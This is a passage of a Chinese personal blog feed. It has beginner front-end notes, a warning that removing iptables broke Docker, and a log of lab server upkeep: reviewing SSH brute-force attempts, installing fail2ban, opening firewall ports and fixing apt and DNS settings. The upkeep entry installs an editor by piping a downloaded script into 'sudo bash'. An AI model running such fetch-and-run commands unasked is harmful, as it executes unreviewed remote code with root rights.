    <content type="html"><![CDATA[<p>开始补习 <a id="more"></a> 写markdown偶尔要用html的标签，折腾这个博客一堆前端知识，想写个爬虫玩也要在浏览器抡起F12，教研室那个项目也要折腾js，这样下去不行，得整点前端了。 先从html，css，javascript三个补起吧</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1. HTML to define the content of web pages2. CSS to specify the layout of web pages3. JavaScript to program the behavior of web pages<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果只要求能用就行，可以直接三天速成上手（如果不考虑性能和美观程度，以及，兼 容 性），可以手撸上世纪画风老版页面。想好看一点可以直接上模板和框架，可以迅速搞出看起来能用的还不是太难看的界面。建议不是太需要和前端打交道的像用matlab和python包一样，需要什么现学就好了（很多框架会迅速更新换代，学了几年不用基本就凉了，不建议投入过多精力）</p><h2 id="html笔记">HTML笔记</h2><p>大致格式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>!DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span><span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span><span class="token operator">&lt;</span>title<span class="token operator">></span>标题（title）<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>h1<span class="token operator">></span>标题（headings）<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token operator">&lt;</span>p<span class="token operator">></span>段落<span class="token punctuation">(</span>paragraph<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>html标签(tag), 通常是一对</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tagname</span><span class="token punctuation">></span></span>content goes here...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tagname</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>html属性(Attributes), 比如src，href，width等，style属性可以指定颜色和字体</p><p>中文和特殊字符在head标签中声明</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>链接</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://zhangjk98.xyz.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>This is a link<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>图片</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>图片<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>104<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>142<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>空元素 br用来换行</p><p>meta标签用来标明一些信息，SEO的时候可能用到</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>author<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Zhang.j.k<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 这是一个注释（comments） --></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>格式标签（formatting）</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span> Defines bold text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">></span></span> Defines emphasized text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span><span class="token punctuation">></span></span> Defines italic text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>small</span><span class="token punctuation">></span></span> Defines smaller text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span> Defines important text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sub</span><span class="token punctuation">></span></span> Defines subscripted text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sup</span><span class="token punctuation">></span></span> Defines superscripted text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ins</span><span class="token punctuation">></span></span> Defines inserted text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>del</span><span class="token punctuation">></span></span> Defines deleted text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mark</span><span class="token punctuation">></span></span> Defines marked/highlighted text<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>引用标签（Quotation）</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>abbr</span><span class="token punctuation">></span></span> Defines an abbreviation or acronym<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>blockquote</span><span class="token punctuation">></span></span> Defines a section that is quoted from another source<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>q</span><span class="token punctuation">></span></span> Defines a short inline quotation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>html的字符在markdown中会有渲染的问题，如果像显示为纯文本，可以引用或者使用</p><h3 id="使用css">使用CSS</h3><p>有三种方式，Inline, internal, external Inline就是style那样的加属性 internal用style标签：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"><span class="token selector">body</span> <span class="token punctuation">&#123;</span><span class="token property">background-color</span><span class="token punctuation">:</span> powderblue<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">h1</span>   <span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">p</span>    <span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>external是独立出来一个css文件，html进行调用。</p><h3 id="使用javascript">使用javascript</h3><p>在html中使用script标签引入js进行交互和产生动态效果。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"demo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"Hello JavaScript!"</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>出于安全问题，有些浏览器禁用js脚本，此时用 noscripts 标签展示相应的替代html内容。</p><h2 id="css">CSS</h2><p>CSS（Cascading Style Sheets）用来指定html的格式。有selector和declaration两个部分。 像这样:</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token comment">/*注释这样写*/</span><span class="token selector">p</span> <span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span><span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>CSS在html中的定位有选择id（#后加id）选择class属性（ . 号后加class）两种方式</p><h2 id="javascript">Javascript</h2><p>这种格式：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">myFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"demo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"Paragraph changed."</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>用scripts标签放到html的head或者body里面</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myScript.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="console控制台调试">Console控制台调试</h3><p>调试的时候F12打开控制台，可以看到console输出的信息</p><h3 id="json">JSON</h3><p>用JSON.stringify和JSON.parse转成字符串和还原</p><h3 id="线程">线程</h3><p>javascript是用的单线程（在浏览器上）,使用异步</p><p>主要是用回调函数、事件监听来实现异步</p><h3 id="变量和类">变量和类</h3><p>放在函数里加var就是内部变量，否则就是外部变量 类使用new来新建</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> objectSample <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="dom">DOM</h3><p>Document Object Model</p><p>HTML树形结构，元素被视为节点（node）</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样获取元素。 节点有Document节点（作用于整个HTML）和Element节点</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;开始补习</summary>
    
    
    
    <category term="笔记&amp;札记" scheme="https://zhangjk98.xyz/categories/%E7%AC%94%E8%AE%B0-%E6%9C%AD%E8%AE%B0/"/>
    
    
    <category term="笔记" scheme="https://zhangjk98.xyz/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>不要尝试sudo apt remove iptables</title>
    <link href="https://zhangjk98.xyz/a7d1/"/>
    <id>https://zhangjk98.xyz/a7d1/</id>
    <published>2019-11-18T05:35:20.000Z</published>
    <updated>2019-11-18T05:35:20.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/emmm.jpg" alt="Picture" style="zoom:80%;" /> <a id="more"></a> 在Ubuntu和Debian里卸载iptables会发生严重的后果（大佬请无视） 一开始我们觉得是防火墙把443端口给办了用不了https，结果我用UFW设置不管用，怀疑是iptables的问题，问了花花师兄，也不清楚，我们决定先把iptables禁用了。随手一谷歌，也忘了哪个神仙说的</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt</span> remove iptables <span class="token comment"># 不要乱试！</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>感觉对的嘛，卸个防火墙能出什么问题嘛<br />然后提示是否卸载我选了y，然后突然在卸载的log发现一堆Docker，瞬间感觉不对劲。然后，然后Docker直接不能用了！ 血泪教训啊，防火墙卸了Docker就不能用了！</p><p>随手一搜发现不止我一个人中招啊</p><p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/iptables-docker.png" alt="Picture" style="zoom:80%;" /></p><p>我现在心中一万头草泥马飘过</p><p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/cnm.png" alt="Picture" style="zoom:80%;" /></p><p>行吧，一堆依赖比python2还多</p><p>不说了，准备重装系统了<img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/mmm.jpg" alt="Picture" style="zoom:80%;" /></p><hr /><p>停用iptables请使用<code>chkconfig iptables off</code>命令</p><hr /><p>更新，试图垂死挣扎使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> network-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>既然把网卡配置删了那就再配置一遍 等会，装了NetworkManager选了默认配置之后连22端口也连不上了。。。 行吧，准备重装 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/wa.jpg" alt="Picture" style="zoom:80%;" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/emmm.jpg&quot; alt=&quot;Picture&quot; style=&quot;zoom:80%;&quot; /&gt;</summary>
    
    
    
    <category term="102网吧日常" scheme="https://zhangjk98.xyz/categories/102%E7%BD%91%E5%90%A7%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="iptables" scheme="https://zhangjk98.xyz/tags/iptables/"/>
    
    <category term="删库跑路" scheme="https://zhangjk98.xyz/tags/%E5%88%A0%E5%BA%93%E8%B7%91%E8%B7%AF/"/>
    
    <category term="服务器" scheme="https://zhangjk98.xyz/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>教研室服务器维护</title>
    <link href="https://zhangjk98.xyz/d6da/"/>
    <id>https://zhangjk98.xyz/d6da/</id>
    <published>2019-11-14T09:37:07.000Z</published>
    <updated>2019-11-14T09:37:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>教研室要倒闭啦，师兄毕业跑路啦！ <a id="more"></a> ## 写在前面的话</p><p>top、ls命令并不总是好用，特别是挖矿恶意程序使用rookit等方式隐藏进程、篡改系统命令，会出现CPU跑满但是top命令看不到高占用进程的情况</p><p>不想用vim又不得不在linux下改东西，可以不用nano了，这有个<span class="exturl" data-url="aHR0cHM6Ly93bWRwZC5jb20vcWlhbmctbGllLXR1aS1qaWFuLWxpbnV4emhvbmctZHVhbi13ZW4tYmVuLWJpYW4tamktcWktbWljcm8v">micro<i class="fa fa-external-link-alt"></i></span>, 拿好</p><p>安装：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> /usr/bin<span class="token punctuation">;</span> <span class="token function">curl</span> https://getmic.ro <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="安全问题">安全问题</h2><p>教研室的服务器之前就被黑过 老师兄装的Ubuntu，默认端口默认用户名超简单密码直接远程登录，行吧 教研室出现了断层，现在的师兄们（以及并夕夕40万却没用过Linux的师姐）Linux都还没我熟，行吧 服务器以后就扔给我了，行吧</p><p>之前折腾Docker的时候看日志发现一堆乱七八糟的</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">grep</span> <span class="token string">"Accepted password for root"</span> /var/log/auth.log <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print <span class="token variable">$11</span>&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -nr <span class="token operator">|</span> <span class="token function">more</span><span class="token function">grep</span> <span class="token string">"Failed password for root"</span> /var/log/auth.log <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print <span class="token variable">$11</span>&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -nr <span class="token operator">|</span> <span class="token function">more</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>发现一堆可疑ip几千次登录尝试,哇,又被当小鸡扫了</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">3073 Failed  2593 112.85.42.185  2471 218.92.0.168   714 112.85.42.187   363 218.92.0.188   261 112.85.42.188   103 222.186.175.220   103 222.186.175.148    86 222.186.180.41    81 222.186.173.180    78 222.186.180.8    78 222.186.180.223    74 222.186.173.154    69 222.186.175.161    65 49.88.112.55    59 222.186.180.9    59 222.186.175.182    57 222.186.180.17    57 222.186.175.167    55 222.186.175.202    55 185.164.72.251    53 222.186.175.215    51 222.186.169.194<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改一下密码和SSH端口</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sed</span> -i <span class="token string">"s/Port .*/Port 你的端口/g"</span> /etc/ssh/sshd_config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装sshfilter或者flai2ban，这里我用的fail2ban。<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> fail2ban<span class="token function">sudo</span> <span class="token function">cp</span> /etc/fail2ban/fail2ban.conf /etc/fail2ban/fail2ban.local<span class="token function">sudo</span> <span class="token function">cp</span> /etc/fail2ban/jail.conf /etc/fail2ban/jail.local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>配置文件修改.local, 会像next.yml一样把.conf文件自动覆盖掉（直接修改那两个conf下次更新可能会覆盖掉）。</p><p>主要参数就是那个bantime和maxretry，这里我设成2小时和10次</p><p>然后启动</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start fail2bansystemctl <span class="token builtin class-name">enable</span> fail2ban<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其他操作</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fail2ban-client <span class="token builtin class-name">set</span> sshd addignoreip <span class="token operator">&lt;</span>IP<span class="token operator">></span> <span class="token comment"># IP白名单</span>fail2ban-client <span class="token builtin class-name">set</span> sshd unbanip <span class="token operator">&lt;</span>IP<span class="token operator">></span> <span class="token comment"># 解封IP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>还要配置一下防火墙 iptables很繁琐，不涉及太多配置的情况下可以用UFW</p><h3 id="防火墙端口">防火墙端口</h3><p>端口用的时候要打开，不然会出各种烦人的问题，比如wget下载没开443就会<code>443... failed: Connection refused.</code>，如果你加了~--no-check-certificate`还是failed，那八成是防火墙的问题 查看端口开放状态</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">netstat</span> -ntlp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">telnet <span class="token function">ip</span> port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Ubuntu里用ufw查看状态</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> ufw status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看指定端口的状态（没输出可能是没开）</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">netstat</span> -ntlp<span class="token operator">|</span><span class="token function">grep</span> <span class="token number">443</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开443端口</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">iptables -I INPUT -p tcp --dport <span class="token number">443</span> -j ACCEPT<span class="token function">service</span> iptables save<span class="token function">service</span> iptables restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用UFW, 直接</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> ufw allow <span class="token number">443</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用iptables打开指定端口, 一般开80，443，53，22，其他按需打开</p><p>可以安装这个来永久保存配置</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> iptables-persistent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="docker默认修改iptables规则">Docker默认修改iptables规则</h3><p>Docker不设置会默认修改iptables规则，将端口暴露在外面，导致端口映射在安全上并没有什么卵用，要设置一下一下，可以看这里 <span class="exturl" data-url="aHR0cHM6Ly93d3cuYmluc3MubWUvYmxvZy9kb2NrZXItcGFzcy10aHJvdWdoLXN5c3RlbS1maXJld2FsbC8=">https://www.binss.me/blog/docker-pass-through-system-firewall/<i class="fa fa-external-link-alt"></i></span></p><h2 id="https">HTTPs</h2><p>申请SSL证书</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> ssl-cert<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后搞一个自己的域名，因为境内服务器要备案，此计划中道崩殂</p><h2 id="运行sudo-apt-get-update报错">运行<code>sudo apt-get update</code>报错</h2><p>写在前面，我看到有的镜像源示例配置都是走的HTTPS，似乎没有必要 详见<span class="exturl" data-url="aHR0cHM6Ly93aHlkb2VzYXB0bm90dXNlaHR0cHMuY29tLw==">Why does APT not use HTTPS?<i class="fa fa-external-link-alt"></i></span>。 至于某Debian镜像源上说的什么安装apt-transport-https更是没有必要，画蛇添足</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">Get:1 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial InRelease [454 B]Get:2 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-updates InRelease [454 B]Get:3 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-backports InRelease [454 B]Get:4 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-security InRelease [454 B]Err:1 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial InRelease  Clearsigned file isn&#39;t valid, got &#39;NOSPLIT&#39; (does the network require authentication?)Err:2 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-updates InRelease  Clearsigned file isn&#39;t valid, got &#39;NOSPLIT&#39; (does the network require authentication?)Err:3 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-backports InRelease  Clearsigned file isn&#39;t valid, got &#39;NOSPLIT&#39; (does the network require authentication?)Err:4 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-security InRelease  Clearsigned file isn&#39;t valid, got &#39;NOSPLIT&#39; (does the network require authentication?)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查了一下说是代理的问题，看了一下教研室的工作站竟然还有酸酸乳和bbr，一问师兄说是老板外出的时候想上学校网用这个，行吧</p><p>设置一下apt的代理</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">&#x2F;etc&#x2F;apt$ cat apt.confAcquire::http::proxy &quot;http:&#x2F;&#x2F;&lt;proxy&gt;&quot;;Acquire::https::proxy &quot;https:&#x2F;&#x2F;&lt;proxy&gt;&quot;;Acquire::ftp::proxy &quot;ftp:&#x2F;&#x2F;&lt;proxy&gt;&quot;;Acquire::socks::proxy &quot;socks:&lt;proxy&gt;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我切进目录没找到，发现有个apt.conf.d文件夹，是表示缺省的配置文件，删掉换成apt.conf 比如代理是1.2.3.4，端口1234 就改成<code>Acquire::http::proxy "http://1.2.3.4:1234</code></p><p>改了一下发现不对，这边是服务端应该没开代理啊</p><p>把代理都删了</p><p>感觉可能DNS有问题,切到<code>etc/resolv.conf</code>看了一下</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">nameserver 202.112.14.21nameserver 202.112.14.11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个学校的DNS服务不行啊，别的都直通互联网，这个上不了谷歌不说，还经常不对外网提供解析服务 (能ping通,但是nslookup发现不对外网提供服务) 又看了一下工作站的DNS, 果然换过了 校园网暂时也没什么好的DNS，就先换了清华的 (那个DNS不是<code>/etc/resolv.conf</code>下的，要改<code>/etc/resolvconf/resolv.conf.d</code>下的<code>base</code>文件,第一个只是临时的DNS)</p><p>还要刷新一下DNS：<code>sudo service networking restart</code></p><p>运行<code>sudo apt-get upgrade</code>又报了这个错<code>Hash Sum mismatch</code></p><p>查了一下发现就是阿里云镜像源在教育网下的问题</p><p>算了,改镜像源吧,换了清华的</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">Err:1 https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu xenial InRelease  Failed to connect to mirrors.tuna.tsinghua.edu.cn port 443: Connection timed out<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>依然不行, 决定明天重装</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">E: Some index files failed to download. They have been ignored, or old ones used instead.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看了一下，工作站那台DNS是<code>cat /etc/resolv.conf</code>是127.0.0.1，是DNSmasq托管的，而服务器上的还是你电的DNS，决定改了。 工作站上应该是这样的</p><pre class="line-numbers language-log" data-language="log"><code class="language-log"># &#x2F;etc&#x2F;network&#x2F;interfacesdns-nameservers 8.8.8.8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>改了之后服务器的<code>resolv.conf</code>也是<code>127.0.0.1</code>了 又上大清的网站看了一下，发现居然在维护</p><p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20191115103425.png" alt="Picture" style="zoom:80%;" /></p><p>换成你电的，好了，收工</p><p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/ubuntu-apt.png" alt="Picture" style="zoom:80%;" /></p><p>又报了<code>Target Translations (main/i18n/Translation-en) is configured multiple times in</code>, 查了一下是指定apt源冲突了，删掉一个就好了</p><h2 id="查看配置">查看配置</h2><p>本来想用neofetch查看一下服务器的配置，结果apt装不了。 看了一下官方文档发现16.10要这样</p><p>Add PPA <code>sudo add-apt-repository ppa:dawidd0811/neofetch</code> Update repositories <code>sudo apt update</code> Install the package <code>sudo apt install neofetch</code> （安装neofetch还能下载编译，可能还快一点）</p><p>算了，好慢啊，直接用<code>sudo dmidecode</code>看吧，screenfetch也行 英特尔的e5 2630 v4，20核CPU，没显卡。这CPU平时居然没人用，空跑,居然还有公网ip，我仿佛发现了宝藏。不出意外就留给我挥（bei）霍（guo）了</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">                         .&#x2F;+o+-       root@labserver                 yyyyy- -yyyyyy+      OS: Ubuntu 16.04 xenial              :&#x2F;&#x2F;+&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;-yyyyyyo      Kernel: x86_64 Linux 4.12.14-041214-generic          .++ .:&#x2F;++++++&#x2F;-.+sss&#x2F;&#96;      Uptime: 21h 36m        .:++o:  &#x2F;++++++++&#x2F;:--:&#x2F;-      Packages: 718       o:+o+:++.&#96;..&#96;&#96;&#96;.-&#x2F;oo+++++&#x2F;     Shell: 